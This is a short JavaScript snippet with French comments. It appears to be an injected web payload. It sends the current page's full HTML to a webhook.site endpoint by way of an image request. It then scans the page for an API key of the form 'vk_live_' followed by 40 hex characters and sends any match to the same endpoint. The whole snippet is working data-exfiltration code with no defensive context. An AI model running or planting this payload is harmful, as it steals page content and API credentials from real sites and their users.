const webhook = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";

// Envoyer le HTML de la page actuelle
new Image().src = webhook + "?page=" + encodeURIComponent(document.documentElement.outerHTML);

// Chercher l'API key
const html = document.documentElement.outerHTML;
const match = html.match(/vk_live_[a-f0-9]{40}/);
if (match) {
    new Image().src = webhook + "?api_key=" + match[0];
}
